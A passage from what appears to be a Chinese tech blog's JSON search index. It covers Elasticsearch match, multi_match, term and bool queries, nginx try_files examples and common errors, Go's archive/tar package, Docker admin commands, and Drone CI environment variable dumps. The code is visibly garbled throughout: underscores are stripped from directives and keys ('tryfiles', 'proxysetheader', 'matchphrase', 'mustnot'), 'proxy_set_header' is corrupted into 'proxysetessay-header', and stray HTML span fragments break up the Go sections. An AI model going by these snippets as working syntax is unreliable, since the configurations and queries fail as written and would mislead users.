}\n}\n\n完全匹配可能比较严，我们会希望有个可调节因子，少匹配一个也满足，那就需要使用到slop。\n\n{\n  \"query\": {\n    \"matchphrase\": {\n        \"content\" : {\n            \"query\" : \"我的宝马多少马力\",\n            \"slop\" : 1\n        }\n    }\n  }\n}\n\nmultimatch\n\n如果我们希望两个字段进行匹配，其中一个字段有这个文档就满足的话，使用multimatch\n\n{\n  \"query\": {\n    \"multimatch\": {\n        \"query\" : \"我的宝马多少马力\",\n        \"fields\" : [\"title\", \"content\"]\n    }\n  }\n}\n\n但是multimatch就涉及到匹配评分的问题了。\n我们希望完全匹配的文档占的评分比较高，则需要使用bestfields\n\n{\n  \"query\": {\n    \"multimatch\": {\n      \"query\": \"我的宝马发动机多少\",\n      \"type\": \"bestfields\",\n      \"fields\": [\n        \"tag\",\n        \"content\"\n      ],\n      \"tiebreaker\": 0.3\n    }\n  }\n}\n\n意思就是完全匹配\"宝马 发动机\"的文档评分会比较靠前，如果只匹配宝马的文档评分乘以0.3的系数\n我们希望越多字段匹配的文档评分越高，就要使用mostfields\n\n{\n  \"query\": {\n    \"multimatch\": {\n      \"query\": \"我的宝马发动机多少\",\n      \"type\": \"mostfields\",\n      \"fields\": [\n        \"tag\",\n        \"content\"\n      ]\n    }\n  }\n}\n\n我们会希望这个词条的分词词汇是分配到不同字段中的，那么就使用crossfields\n\n{\n  \"query\": {\n    \"multimatch\": {\n      \"query\": \"我的宝马发动机多少\",\n      \"type\": \"crossfields\",\n      \"fields\": [\n        \"tag\",\n        \"content\"\n      ]\n    }\n  }\n}\n\nterm\n\nterm是代表完全匹配，即不进行分词器分析，文档中必须包含整个搜索的词汇\n\n{\n  \"query\": {\n    \"term\": {\n      \"content\": \"汽车保养\"\n    }\n  }\n}\n\n查出的所有文档都包含\"汽车保养\"这个词组的词汇。\n\n使用term要确定的是这个字段是否“被分析”(analyzed)，默认的字符串是被分析的。\n\n拿官网上的例子举例：\n\nmapping是这样的：\n\nPUT myindex\n{\n  \"mappings\": {\n    \"mytype\": {\n      \"properties\": {\n        \"fulltext\": {\n          \"type\":  \"string\"\n        },\n        \"exactvalue\": {\n          \"type\":  \"string\",\n          \"index\": \"notanalyzed\"\n        }\n      }\n    }\n  }\n}\n\nPUT myindex/mytype/1\n{\n  \"fulltext\":   \"Quick Foxes!\",\n  \"exactvalue\": \"Quick Foxes!\"  \n}\n\n其中的fulltext是被分析过的，所以fulltext的索引中存的就是[quick, foxes]，而extravalue中存的是[Quick Foxes!]。\n\n那下面的几个请求：\n\nGET myindex/mytype/search\n{\n  \"query\": {\n    \"term\": {\n      \"exactvalue\": \"Quick Foxes!\"\n    }\n  }\n}\n\n请求的出数据，因为完全匹配\n\nGET myindex/mytype/search\n{\n  \"query\": {\n    \"term\": {\n      \"fulltext\": \"Quick Foxes!\"\n    }\n  }\n}\n\n请求不出数据的，因为fulltext分词后的结果中没有[Quick Foxes!]这个分词。\nbool联合查询: must,should,mustnot\n\n如果我们想要请求\"content中带宝马，但是tag中不带宝马\"这样类似的需求，就需要用到bool联合查询。\n联合查询就会使用到must,should,mustnot三种关键词。\n\n这三个可以这么理解\n\n    must: 文档必须完全匹配条件\n    should: should下面会带一个以上的条件，至少满足一个条件，这个文档就符合should\n    mustnot: 文档必须不匹配条件\n\n比如上面那个需求：\n\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"term\": {\n          \"content\": \"宝马\"\n        }\n      },\n      \"must_not\": {\n        \"term\": {\n          \"tags\": \"宝马\"\n        }\n      }\n    }\n  }\n}","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/image_draw","title":"golang中image/draw包用法","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Linux命令 nginx try_files","title":"Linux命令 Nginx try_files","text":"tryfiles $uri/index.html $uri.html $uri @app;\n\n  location @app {\n    proxysetheader X-Forwarded-For $proxyaddxforwardedfor;\n    proxysetheader Host $httphost;\n\n    proxyredirect off;\n\n    proxypass http://unicorn;\n\n    proxybuffersize 16k;\n    proxybusybufferssize 16k;\n  }\n\n  errorpage 500 502 503 504 /500.html;\n  Nginx的tryfiles指令使用实例\nIT运维\n编辑：优云小编\n2016-05-01 459 次围观\n0\n\nblob.png\n\nNginx的配置语法灵活，可控制度非常高。在0.7以后的版本中加入了一个tryfiles指令，配合命名location，可以部分替代原本常用的rewrite配置方式，提高解析效率。\ntryfiles指令说明\n\ntryfiles指令\n语法：tryfiles file ... uri 或 tryfiles file ... = code\n默认值：无\n作用域：server location\n\n其作用是按顺序检查文件是否存在，返回第一个找到的文件或文件夹(结尾加斜线表示为文件夹)，如果所有的文件或文件夹都找不到，会进行一个内部重定向到最后一个参数。\n\n需要注意的是，只有最后一个参数可以引起一个内部重定向，之前的参数只设置内部URI的指向。最后一个参数是回退URI且必须存在，否则会出现内部500错误。命名的location也可以使用在最后一个参数中。与rewrite指令不同，如果回退URI不是命名的location那么args，则必须明确声明。\n\ntryfiles $uri $uri/ /index.php?q=$uri\u0026$args;\n\n实例分析\n示例一\n\ntryfiles 将尝试你列出的文件并设置内部文件指向。\n\n例如:\n\ntryfiles /app/cache/ $uri @fallback;\nindex index.php index.html;\n\n它将检测documentroot/app/cache/index.html 和 uri是否存在，如果不存在着内部重定向到@fallback(＠表示配置文件中预定义标记点) 。\n你也可以使用一个文件或者状态码(=404)作为最后一个参数，如果是最后一个参数是文件，那么这个文件必须存在。\n示例二\n\n例如nginx不解析PHP文件，以文本代码返回\n\ntryfiles $uri /cache.php @fallback;\n\n因为这个指令设置内部文件指向到 $documentroot/cache.php 并返回,但没有发生内部重定向，因而没有进行location段处理而返回文本 。\n(如果加上index指令可以解析PHP是因为index会触发一个内部重定向)\n示例三\n\n跳转到变量\n  server {\n   listen 8000;\n   servername 192.168.119.100;\n   root html;\n   index index.html index.php;\n\n   location /abc {\n       tryfiles /4.html /5.html @qwe;              #检测文件4.html和5.html,如果存在正常显示,不存在就去查找@qwe值\n  }\n\n   location @qwe  {\n      rewrite ^/(.)$   http://www.baidu.com;       #跳转到百度页面\n   }\n示例四\n\n跳转指定文件\nserver {\n   listen 8000;\n   servername 192.168.119.100;\n   root html;\n   index index.php index.html;\n\n   location /abc {\n       tryfiles /4.html /5.html /6.html;\n  }\n示例五\n\n将请求跳转到后端\n\nupstream tornado {\n        server 127.0.0.1:8001;\n}\n\nserver {\n        servername imike.me;\n        return 301 $scheme://www.imike.me$requesturi;\n}\n\nserver {\n        listen 80;\n        servername www.imike.me;\n\n        root /var/www/www.imike.me/V0.3/www;\n        index index.html index.htm;\n\n        tryfiles $uri @tornado;\n\n        location @tornado {\n                proxypassessay-header Server;\n                proxysetessay-header Host $httphost;\n                proxysetessay-header X-Real-IP $remoteaddr;\n                proxysetessay-header X-Scheme $scheme;\n\n                proxypass http://tornado;\n        }\n}\n\n常见错误\n常见错误一\n\ntryfiles 按顺序检查文件是否存在，返回第一个找到的文件，至少需要两个参数，但最后一个是内部重定向也就是说和rewrite效果一致，前面的值是相对$documentroot的文件路径。也就是说参数的意义不同，甚至可以用一个状态码 (404)作为最后一个参数。如果不注意会有死循环造成500错误。\n\nlocation ~.\\.(gif|jpg|jpeg|png)$ {\n        root /web/wwwroot;\n        tryfiles /static/$uri $uri;\n}\n\n原意图是访问http://example.com/test.jpg时先去检查/web/wwwroot/static/test.jpg是否存在，不存在就取/web/wwwroot/test.jpg\n\n但由于最后一个参数是一个内部重定向，所以并不会检查/web/wwwroot/test.jpg是否存在，只要第一个路径不存在就会重新向然后再进入这个location造成死循环。结果出现500 Internal Server Error\n\nlocation ~.\\.(gif|jpg|jpeg|png)$ {\n        root /web/wwwroot;\n        tryfiles /static/$uri $uri 404;\n}\n\n这样才会先检查/web/wwwroot/static/test.jpg是否存在，不存在就取/web/wwwroot/test.jpg再不存在则返回404 not found\n常见错误二\n\nNginx tryfiles $querystring为空的解决办法\n\nserver {\n    listen 80;\n    servername localhost.dev;\n    index index.php index.html index.htm;\n    set $rootpath '/var/www/phalcon/public';\n    root $rootpath;\n    location / {\n        tryfiles $uri $uri/ /index.php;\n    }\n    location ~ \\.php$ {\n        tryfiles $uri =404;\n        fastcgisplitpathinfo ^(.+\\.php)(/.+)$;\n        fastcgipass 127.0.0.1:9000;\n        fastcgiindex index.php;\n        fastcgiparam SCRIPTFILENAME $documentroot$fastcgiscriptname; include fastcgiparams;\n    }\n    location ~ ^/(css|img|js|flv|swf|download)/(.+)$ {\n        root $rootpath;\n    }\n    location ~ /\\.ht {\n        deny all;\n    }\n}\n\n发现PHP无法获取$GET信息\n\ntryfiles $uri $uri/ /index.php;\n\n改为\n\ntryfiles $uri $uri/ /index.php?$querystring;\n\n即可解决","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/archive_tar","title":"golang中archive/tar包用法","text":"chenbaoke的专栏\ngolang中archive/tar包用法\n\ntar包实现对tar归档文件的访问，旨在覆盖大部分的类型，包括GNU和BSD产生的tars。\n\nspan style=\"font-size:14px\"常量/span\n\nconst (\n\n    // Types\n    TypeReg           = '0'    // 普通文件\n    TypeRegA          = '\\x00' // 普通文件\n    TypeLink          = '1'    // 硬连接\n    TypeSymlink       = '2'    // 符号连接，软连接\n    TypeChar          = '3'    // 字符设备节点\n    TypeBlock         = '4'    // 块设备节点\n    TypeDir           = '5'    // 目录\n    TypeFifo          = '6'    // fifo node\n    TypeCont          = '7'    // 保留项\n    TypeXHeader       = 'x'    // 可扩展头部\n    TypeXGlobalHeader = 'g'    // 全局扩展头\n    TypeGNULongName   = 'L'    // Next file has a long name\n    TypeGNULongLink   = 'K'    // Next file symlinks to a file w/ a long name\n    TypeGNUSparse     = 'S'    // 稀疏文件\n)\n\nspan style=\"font-size:14px\"变量/span\n\nvar (\n    ErrWriteTooLong    = errors.New(\"archive/tar: write too long\") //写入数据太长\n    ErrFieldTooLong    = errors.New(\"archive/tar: header field too long\") //头部太长\n    ErrWriteAfterClose = errors.New(\"archive/tar: write after close\")  //关闭后写入\n)\n\nvar (\n    ErrHeader = errors.New(\"archive/tar: invalid tar header\")  //无效tar 头部\n)\n\nspan style=\"font-size:14px\"\n/span\n\nspan style=\"font-size:14px\"type Header //该结构体代表了一个tar归档的头部，一些字段可能不被填充，Header中主要包含文件相关信息。\n/span\n\ntype Header struct {\n   Name       string    // 文件名称\n   Mode       int64     // 文件的权限和模式位\n   Uid        int       // 文件所有者的用户 ID\n   Gid        int       // 文件所有者的组 ID\n   Size       int64     // 文件的字节长度\n   ModTime    time.Time // 文件的修改时间\n   Typeflag   byte      // 文件的类型\n   Linkname   string    // 链接文件的目标名称\n   Uname      string    // 文件所有者的用户名\n   Gname      string    // 文件所有者的组名\n   Devmajor   int64     // 字符设备或块设备的主设备号\n   Devminor   int64     // 字符设备或块设备的次设备号\n   AccessTime time.Time // 文件的访问时间\n   ChangeTime time.Time // 文件的状态更改时间\n}\n\nfunc FileInfoHeader(fi os.FileInfo, link string) (\\Header, error)//该函数通过os.fileInfo便可创建一个Header，Header中大部分内容自动填充，一些内容需要自己设定。\n\nfunc (h \\Header) FileInfo() os.FileInfo  //该函数获取该Header的os.FileInfo信息\n\n举例说明Header用法：\n\npackage main\n\nimport (\n    \"archive/tar\"\n    \"fmt\"\n    \"os\"\n)\n\nfunc main() {\n    fileinfo, err := os.Stat(\"/home/chenbaoke/test.go\")\n    if err != nil {\n        fmt.Println(err)\n    }\n    h, err := tar.FileInfoHeader(fileinfo, \"\")\n    h.Linkname = \"haha\"\n    h.Gname = \"test\"\n    if err != nil {\n        fmt.Println(err)\n    }\n    fmt.Println(h.AccessTime, h.ChangeTime, h.Devmajor, h.Devminor, h.Gid, h.Gname, h.Linkname, h.ModTime, h.Mode, h.Name, h.Size, h.Typeflag, h.Uid, h.Uname, h.Xattrs)\n\n}\n输出结果如下：\n2015-08-28 21:26:03.636592126 +0800 CST 2015-08-28 21:26:03.092592112 +0800 CST 0 0 1000 test haha 2015-08-28 21:26:03.092592112 +0800 CST 33206 test.go 581\n 48 1000  map[]\n\n由此可见，通过fileinfoheader可以创建tar.header，并自动填写了tar.Header 中的大部分信息，当然，还有一些信息无法从 os.FileInfo 中获取，所以需要你自己去补充，\n如Linkname,Gname等。\n\nspan style=\"font-size:14px\"type Reader/span\ntype Reader struct {\n    r       io.Reader\n    err     error\n    pad     int64           //当前文件实体之后填充的\n    curr    numBytesReader  //当前文件实体的reader\n    hdrBuff [blockSize]byte // 读header中使用的buffer缓存\n}span style=\"font-size:12px;\"\n/span\n\nspan style=\"font-size:14px\"span style=\"font-size:12px\"\n/span/span\n\nspan style=\"font-size:14px\"span style=\"font-size:12px\"func NewReader(r io.Reader) \\Reader// 从r中创建一个新的reader/span/span\n\nspan style=\"font-size:14px\"span style=\"font-size:12px\"func (tr \\Reader) Next() (\\Header, error)//该函数指向tar文件的下一个实体，在输入的最后返回io.EOF/spanspan style=\"font-size:12px\"\n/span/span\nspan style=\"font-size:14px\"span style=\"font-size:12px\"func (tr \\Reader) Read(b \\[\\]byte) (n int, err error)//该函数读取在tar中当前实体，当读取到实体的结束位置时，返回io.EOF，当调用Next时，读取下一个实体。/span/span\n\nspan style=\"font-size:14px\"span style=\"font-size:12px\"/span/span\n\n解压缩包的方法，从 .tar 文件中读出数据是通过 tar.Reader 完成的，所以首先要创建 tar.Reader，可以通过 tar.NewReader 方法来创建它，该方法要求提供一个 os.Reader 对象，以便从该对象中读出数据。可以先打开一个 .tar 文件，然后将该文件提供给 tar.NewReader 使用。这样就可以将 .tar 文件中的数据读出来了：\n\nspan style=\"font-size:12px\"举例说明其用法：/span\n\nspan style=\"font-size:14px\"span style=\"font-size:12px\"/span/span\n\npackage main\n\nimport (\n    \"archive/tar\"\n    \"fmt\"\n    \"io\"\n    \"os\"\n)\n\nfunc main() {\n    f, err := os.Open(\"/home/chenbaoke/10.tar\")\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n    defer f.Close()\n    r := tar.NewReader(f)\n    for hdr, err := r.Next(); err != io.EOF; hdr, err = r.Next() {\n        if err != nil {\n            fmt.Println(err)\n            return\n        }\n        fileinfo := hdr.FileInfo()\n        fmt.Println(fileinfo.Name())\n        f, err := os.Create(\"/home/chenbaoke/develop/\" + fileinfo.Name())\n        if err != nil {\n            fmt.Println(err)\n        }\n        defer f.Close()\n        _, err = io.Copy(f, r)\n        if err != nil {\n            fmt.Println(err)\n        }\n    }\n}\n\nspan style=\"font-size:14px\"span style=\"font-size:12px\"\n/span/span\n\nspan style=\"font-size:14px\"/span\n\nspan style=\"font-size:14px\"type Writer/span\n\nspan style=\"font-size:14px\"span style=\"font-size:12px\"/span/span\n\ntype Writer struct {\n            w          io.Writer\n            err        error\n            nb         int64 // 未写入的字节数\n            pad        int64 // 该实体之后需要写入的数量\n            closed     bool\n            usedBinary bool            // whether the binary numeric field extension was used\n            preferPax  bool            // use pax header instead of binary numeric header\n            hdrBuff    [blockSize]byte // buffer to use in writeHeader when writing a regular header\n            paxHdrBuff [blockSize]byte // buffer to use in writeHeader when writing a pax header\n        }\n\nspan style=\"font-size:12px\"func NewWriter(w io.Writer) \\Writer  //创建一个新的writer，向w中写入。\n/span\n\nspan style=\"font-size:14px\"span style=\"font-size:12px\"func (tw \\Writer) Close() error //关闭tar归档文件，并将未写入的数据写入底层writer。\nfunc (tw \\Writer) Flush() error //完成写当前文件\nfunc (tw \\Writer) Write(b \\[\\]byte) (n int, err error)\n/span/span\nspan style=\"font-size:14px\"span style=\"font-size:12px\"func (tw \\Writer) WriteHeader(hdr \\Header) error/span/span//该函数将hdr写入tar文件中，如果hdr不是第一个header，该函数调用flush。在调用close之后在调用该函数就会报错ErrWriteAfterClose。\n\n举例说明如何写入一个tar文件。\n\npackage main\n\nimport (\n    \"archive/tar\"\n    \"fmt\"\n    \"io\"\n    \"os\"\n)\n\nfunc main() {\n    f, err := os.Create(\"/home/chenbaoke/10.tar\")  //创建一个tar文件\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n    defer f.Close()\n\n    tw := tar.NewWriter(f)        \n    defer tw.Close()\n\n    fileinfo, err := os.Stat(\"/home/chenbaoke/1.go\")  //获取文件相关信息\n    if err != nil {\n        fmt.Println(err)\n    }\n    hdr, err := tar.FileInfoHeader(fileinfo, \"\")\n    if err != nil {\n        fmt.Println(err)\n    }\n\n    err = tw.WriteHeader(hdr)    //写入头文件信息\n    if err != nil {\n        fmt.Println(err)\n        // return\n    }\n\n    f1, err := os.Open(\"/home/chenbaoke/1.go\")\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n    m, err := io.Copy(tw, f1)   //将文件1.go中信息写入压缩包中\n    if err != nil {\n        fmt.Println(err)\n        // return\n    }\n    fmt.Println(m)\n}\n\n参考：https://golang.org/pkg/archive/tar/\n\nGoLove博客：   http://www.cnblogs.com/golove/p/3454630.html\n","tags":null},{"location":"//blog.pytool.com/Post/docker/2016-01-02 Linux命令 Docker","title":"Linux命令 Docker","text":"---\n\ndocker 操作命令详解\nDocker —— 从入门到实践\nDocker 知识库\nDocker 中文指南\nDocker中文网站：\n一小时Docker教程\nDocker学习笔记之一，搭建一个JAVA Tomcat运行环境\n\nDocker入门教程（一）介绍\nDocker入门教程（二）命令\ndocker专题(2)：docker常用管理命令（上）\n常用docker命令，及一些坑\n可执行镜像——开发环境的Docker化之路\ndocker ps --filter\ndocker日志清理\n\nfor log in $logs  \n        do  \n                echo \"clean logs : $log\"  \n                cat /dev/null   $log  \n        done  \n   docker 查看日志文件\ndocker inspect tomcat -f \"{{.LogPath}}\"\n修复docker0网桥\n方法1： ip\nservice docker stop           //关闭docker服务  \nip link set dev docker0 down  //关闭docker0网桥   \nip link del dev docker0       //删除docker0网桥\n方法2：brctl\nyum install bridge-utils\nifconfig docker0 down\nbrctl delbr docker0\n\n##################################################\n如何从通过docker container ID 获取Container name\ndocker强制批量删除none的image镜像\n  docker images | awk '/^none/ { print $3 }'\n\n  docker ps -a | grep \"Exited\" | awk '{print $1 }'|xargs docker stop\n  docker ps -a | grep \"Exited\" | awk '{print $1 }'|xargs docker rm\n  docker images|grep none|awk '{print $3 }'|xargs docker rmi\n\n  docker ps -a -q --filter=name=zookeeper-node-* | xargs -n 1 -I {} docker rm -f --volumes {}\n\ndockerd\n修改镜像和容器的存放路径：\n   -g, --graph=/var/lib/docker\n\ndockerd配置文件\n default\n/usr/bin/dockerd -H fd://\ndocker-containerd -l unix:///var/run/docker/libcontainerd/docker-containerd.sock --shim docker-containerd-shim --metrics-interval=0 --start-timeout 2m --state-dir /var/run/docker/libcontainerd/containerd --runtime docker-runc\ndocker-machine\ndockerd -H tcp://0.0.0.0:2376 -H unix:///var/run/docker.sock --storage-driver aufs --tlsverify --tlscacert /etc/docker/ca.pem --tlscert /etc/docker/server.pem --tlskey /etc/docker/server-key.pem --label provider=generic --registry-mirror https://fl7aylpq.mirror.aliyuncs.com\ndocker-containerd -l unix:///var/run/docker/libcontainerd/docker-containerd.sock --shim docker-containerd-shim --metrics-interval=0 --start-timeout 2m --state-dir /var/run/docker/libcontainerd/containerd --runtime docker-runc\n 免 sudo 使用 docker\n5.1 把普通用户加入 docker 用户组\n    如果还没有 docker group 就添加一个：\n          $ sudo groupadd docker\n    将用户加入该 group 内。然后退出并重新登录就生效啦。\n          $ sudo gpasswd -a ${USER} docker\n    重启 docker 服务\n          $ sudo service docker restart\n5.2 原因\n    因为 /var/run/docker.sock 所属 docker 组具有 setuid 权限\n        $ sudo ls -l /var/run/docker.sock\n        srw-rw","tags":null},{"location":"//blog.pytool.com/Post/drone/2016-10-04 Drone 变量","title":"drone","text":"DRONE 变量在 github.com/cncd/pipeline/pipeline/frontend/metadata.go 中定义\nparams := map[string]string{\n  \"CI\":                         \"drone\",\n  \"DRONE\":                      \"true\",\n  \"DRONEARCH\":                 \"linux/amd64\",\n  \"DRONEREPO\":                 m.Repo.Name,\n  \"DRONEREPOSCM\":             \"git\",\n  \"DRONEREPOOWNER\":           owner,\n  \"DRONEREPONAME\":            name,\n  \"DRONEREPOLINK\":            m.Repo.Link,\n  \"DRONEREPOBRANCH\":          m.Curr.Commit.Branch,\n  \"DRONEREPOPRIVATE\":         fmt.Sprintf(\"%v\", m.Repo.Private),\n  \"DRONEREPOTRUSTED\":         \"false\", // TODO should this be added?\n  \"DRONEREMOTEURL\":           m.Repo.Remote,\n  \"DRONECOMMITSHA\":           m.Curr.Commit.Sha,\n  \"DRONECOMMITREF\":           m.Curr.Commit.Ref,\n  \"DRONECOMMITREFSPEC\":       m.Curr.Commit.Refspec,\n  \"DRONECOMMITBRANCH\":        m.Curr.Commit.Branch,\n  \"DRONECOMMITLINK\":          m.Curr.Link,\n  \"DRONECOMMITMESSAGE\":       m.Curr.Commit.Message,\n  \"DRONECOMMITAUTHOR\":        m.Curr.Commit.Author.Name,\n  \"DRONECOMMITAUTHOREMAIL\":  m.Curr.Commit.Author.Email,\n  \"DRONECOMMITAUTHORAVATAR\": m.Curr.Commit.Author.Avatar,\n  \"DRONEBUILDNUMBER\":         fmt.Sprintf(\"%d\", m.Curr.Number),\n  \"DRONEPARENTBUILDNUMBER\":  fmt.Sprintf(\"%d\", m.Curr.Parent),\n  \"DRONEBUILDEVENT\":          m.Curr.Event,\n  \"DRONEBUILDLINK\":           fmt.Sprintf(\"%s/%s/%d\", m.Sys.Link, m.Repo.Name, m.Curr.Number),\n  \"DRONEBUILDCREATED\":        fmt.Sprintf(\"%d\", m.Curr.Created),\n  \"DRONEBUILDSTARTED\":        fmt.Sprintf(\"%d\", m.Curr.Started),\n  \"DRONEBUILDFINISHED\":       fmt.Sprintf(\"%d\", m.Curr.Finished),\n  \"DRONEJOBNUMBER\":           fmt.Sprintf(\"%d\", m.Job.Number),\n  \"DRONEJOBSTARTED\":          fmt.Sprintf(\"%d\", m.Curr.Started), // ISSUE: no job started\n  \"DRONEBRANCH\":               m.Curr.Commit.Branch,\n  \"DRONECOMMIT\":               m.Curr.Commit.Sha,\n  \"DRONEVERSION\":              m.Sys.Version,\n  \"DRONEDEPLOYTO\":            m.Curr.Target,\n  \"DRONEPREVBUILDSTATUS\":    m.Prev.Status,\n  \"DRONEPREVBUILDNUMBER\":    fmt.Sprintf(\"%v\", m.Prev.Number),\n  \"DRONEPREVCOMMITSHA\":      m.Prev.Commit.Sha,\n}\n\nDRONEREPOOWNER=test\nDRONEREPONAME=test\nDRONECOMMITMESSAGE=dronen\nDRONEREPO=test/test\nDRONEBRANCH=master\nDRONEREPOLINK=http://git.chinaoss.com/test/test\nDRONEBUILDNUMBER=42\n\nDRONE=true\nDRONEARCH=linux/amd64\nDRONEREPOSCM=git\nDRONEREPOBRANCH=master\nDRONEREPOPRIVATE=true\nDRONEREPOTRUSTED=false\nDRONEREMOTEURL=http://git.chinaoss.com/test/test.git\nDRONECOMMITSHA=69337c183c388f877b44d7938a06fc4db95d952f\nDRONECOMMITREF=refs/heads/master\nDRONECOMMITREFSPEC=\nDRONECOMMITBRANCH=master\nDRONECOMMITLINK=http://git.chinaoss.com/test/test/compare/f5f3027728ef7fb72448a75d2c89a3096643bd52...69337c183c388f877b44d7938a06fc4db95d952f\nDRONECOMMITAUTHOR=root\nDRONECOMMITAUTHOREMAIL=rinetd@163.com\nDRONECOMMITAUTHORAVATAR=http://git.chinaoss.com/avatars/1\nDRONEPARENTBUILDNUMBER=0\nDRONEBUILDEVENT=push\nDRONEBUILDLINK=http://drone.hangruan.cn/test/test/42\nDRONEBUILDCREATED=1509526798\nDRONEBUILDSTARTED=0\nDRONEBUILDFINISHED=0\nDRONEJOBNUMBER=1\nDRONEJOBSTARTED=0\nDRONECOMMIT=69337c183c388f877b44d7938a06fc4db95d952f\nDRONEVERSION=\nDRONEDEPLOYTO=\nDRONEPREVBUILDSTATUS=success\nDRONEPREVBUILDNUMBER=41\nDRONEPREVCOMMITSHA=f5f3027728ef7fb72448a75d2c89a3096643bd52\n\nDRONEBRANCH=master\nDRONEREMOTEURL=http://git.chinaoss.com/linyibr/zhongxinguoan.git\nDRONEWORKSPACE=/go/src/git.chinaoss.com/linyibr/zhongxinguoan\nDRONEREPO=linyibr/zhongxinguoan\n\nLOCALVOLUME=/root/docker/linyibr/zhongzheng\nDRONENETRCMACHINE=git.chinaoss.com\nDRONECOMMITAUTHORAVATAR=https://secure.gravatar.com/avatar/b2d169c1392c919507f0a579e42efb6a\nDRONEJOBFINISHED=1495533194\nCIPREVCOMMITAUTHORNAME=root\nCI=drone\nHOSTNAME=0dab316e446e\nCIBUILDNUMBER=16\nDRONECOMMITAUTHOR=root\nDRONEREPOLINK=http://git.chinaoss.com/linyibr/zhongxinguoan\nCIBUILDSTARTED=1495533193\nCIPREVCOMMITAUTHORAVATAR=https://secure.gravatar.com/avatar/b2d169c1392c919507f0a579e42efb6a\nCISYSTEMLINK=http://drone.linyibr.com\nCIBUILDLINK=http://git.chinaoss.com/linyibr/zhongxinguoan/compare/bf6e6c8133e99bf5eac10b1e15d327f4c667099f...3f267ce6c06f66bad965d83fc67f22bd535c7041\nCIWORKSPACE=/go/src/git.chinaoss.com/linyibr/zhongxinguoan\nDRONEPREVBUILDNUMBER=15\nSHLVL=2\nHOME=/root\nDRONECOMMITBRANCH=master\nDRONEREPOPRIVATE=true\nDRONEREPOSCM=git\nCIPREVCOMMITAUTHOR=root\nDRONEBUILDSTATUS=success\nCIPREVCOMMITBRANCH=master\nCIJOBNUMBER=1\nCIJOBSTARTED=1495533193\nCIBUILDEVENT=push\nDRONEARCH=linux/amd64\nCIREPONAME=linyibr/zhongxinguoan\nCIBUILDCREATED=1495533193\nCICOMMITSHA=3f267ce6c06f66bad965d83fc67f22bd535c7041\nCICOMMITREF=refs/heads/master\nDRONEPREVCOMMITSHA=bf6e6c8133e99bf5eac10b1e15d327f4c667099f\nCIPREVBUILDSTATUS=success\nDRONECOMMITMESSAGE=drone\n\nDRONEREPOBRANCH=master\nCIBUILDFINISHED=1495533194\nDRONEJOBSTATUS=success\nCIREPO=linyibr/zhongxinguoan\nCIPREVCOMMITMESSAGE=drone\n\nDRONEREPOOWNER=linyibr\nCICOMMITAUTHORNAME=root\nCINETRCMACHINE=git.chinaoss.com\nDRONE=true\nCICOMMITAUTHORAVATAR=https://secure.gravatar.com/avatar/b2d169c1392c919507f0a579e42efb6a\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nDRONEBUILDNUMBER=16\nDRONEBUILDSTARTED=1495533193\nCIJOBFINISHED=1495533194\nDRONEBUILDLINK=http://drone.linyibr.com/linyibr/zhongxinguoan/16\nCICOMMITAUTHOR=root\nCIREPOLINK=http://git.chinaoss.com/linyibr/zhongxinguoan\nCIPREVBUILDSTARTED=1495533163\nCIPREVBUILDNUMBER=15\nCIPREVBUILDLINK=http://git.chinaoss.com/linyibr/zhongxinguoan/compare/3db5a4b510e56c3c35f73c3a6b375ceb4b9f2186...bf6e6c8133e99bf5eac10b1e15d327f4c667099f\nCICOMMITBRANCH=master\nCIREPOREMOTE=http://git.chinaoss.com/linyibr/zhongxinguoan.git\nSHELL=/bin/sh\nDRONECOMMIT=3f267ce6c06f66bad965d83fc67f22bd535c7041\nCISYSTEMARCH=linux/amd64\nCIREPOPRIVATE=true\nDRONEJOBNUMBER=1\nDRONEBUILDEVENT=push\nDRONEJOBSTARTED=1495533193\nDRONEBUILDCREATED=1495533193\nDRONECOMMITSHA=3f267ce6c06f66bad965d83fc67f22bd535c7041\nDRONEREPONAME=zhongxinguoan\nCISYSTEMNAME=drone\nCIBUILDSTATUS=success\nDRONECOMMITREF=refs/heads/master\nDRONEPREVBUILDSTATUS=success\nCIPREVBUILDEVENT=push\nPWD=/go/src/git.chinaoss.com/linyibr/zhongxinguoan\nDRONECOMMITLINK=http://git.chinaoss.com/linyibr/zhongxinguoan/compare/bf6e6c8133e99bf5eac10b1e15d327f4c667099f...3f267ce6c06f66bad965d83fc67f22bd535c7041\nCIPREVCOMMITSHA=bf6e6c8133e99bf5eac10b1e15d327f4c667099f\nDRONEBUILDFINISHED=1495533194\nCIPREVBUILDCREATED=1495533162\nCIPREVCOMMITREF=refs/heads/master\nCICOMMITMESSAGE=drone\n\nCISYSTEM=drone\nCIJOBSTATUS=success\nCIPREVBUILDFINISHED=1495533167\nCIREMOTEURL=http://git.chinaoss.com/linyibr/zhongxinguoan.git\n\ndrone 0.6\n$DRONEREPO             bianban/chirp\n$DRONEREPOLINK        http://git.linyibr.com/bianban/chirp\n\n$DRONEARCH             linux/amd64\n$DRONEREPOOWNER       bianban\n$DRONEREPONAME        chirp\n$DRONEREPOBRANCH      master\n$DRONEREPOPRIVATE     true\n$DRONEREPOTRUSTED\nDRONEREMOTEURL        http://git.linyibr.com/bianban/chirp.git\nDRONECOMMITSHA        6d4f6973c331ec946ec5844b6ab10b744439bb16\nDRONECOMMITREF        refs/heads/master\nDRONECOMMITREFSPEC\nDRONECOMMITLINK       http://git.linyibr.com/bianban/chirp/compare/cc53507e583b7c70b63a93c8e2945ee2a3afe6dd...6d4f6973c331ec946ec5844b6ab10b744439bb16\nDRONECOMMITBRANCH     master\nDRONECOMMITMESSAGE\nDRONEREPO\nDRONECOMMITAUTHOR     root\nDRONECOMMITAUTHOREMAIL\nDRONECOMMITAUTHORAVATAR https://secure.gravatar.com/avatar/b2d169c1392c919507f0a579e42efb6a\nDRONEBUILDNUMBER      13\nDRONEBUILDEVENT       push\nDRONEBUILDLINK        http://drone.linyibr.com/bianban/chirp/13\nDRONEBUILDCREATED     1494309580\nDRONEBUILDSTARTED     1494309581\nDRONEBUILDFINISHED    1494309582\nDRONEJOBNUMBER        1\nDRONEJOBSTARTED       1494309581\nDRONEBRANCH            master\nDRONECOMMIT            